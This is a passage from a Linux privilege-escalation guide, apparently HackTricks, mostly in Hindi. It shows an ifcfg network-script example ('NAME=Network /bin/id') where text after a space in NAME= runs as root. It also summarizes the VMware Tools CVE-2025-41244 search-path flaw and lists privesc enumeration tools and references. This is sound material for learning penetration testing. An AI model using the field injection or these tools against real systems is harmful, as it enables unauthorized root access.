Network scripts, जैसे _ifcg-eth0_, network connections के लिए इस्तेमाल होते हैं। वे बिल्कुल .INI files जैसे दिखते हैं। हालांकि, Linux पर इन्हें Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया जाता। अगर नाम में **white/blank space** हो, तो system white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद सब कुछ root के रूप में execute होता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_नोट: Network और /bin/id के बीच खाली स्थान पर ध्यान दें_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` में **scripts** होते हैं जो System V init (SysVinit) के लिए हैं, जो **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए scripts शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में मिलने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat systems में एक वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है, और service management tasks के लिए configuration files का उपयोग करता है। Upstart में transition के बावजूद, compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग की जाती हैं।

**systemd** एक modern initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी advanced features प्रदान करता है। यह files को `/usr/lib/systemd/` में distribution packages के लिए और `/etc/systemd/system/` में administrator modifications के लिए व्यवस्थित करता है, जिससे system administration process streamlined हो जाता है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आम तौर पर एक syscall hook करते हैं ताकि privileged kernel functionality को userspace manager के लिए expose किया जा सके। कमजोर manager authentication (जैसे, FD-order पर आधारित signature checks या खराब password schemes) एक local app को manager की नकल करने और पहले से rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation details यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाला एक generalized pattern यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors देखने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns enumerate करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
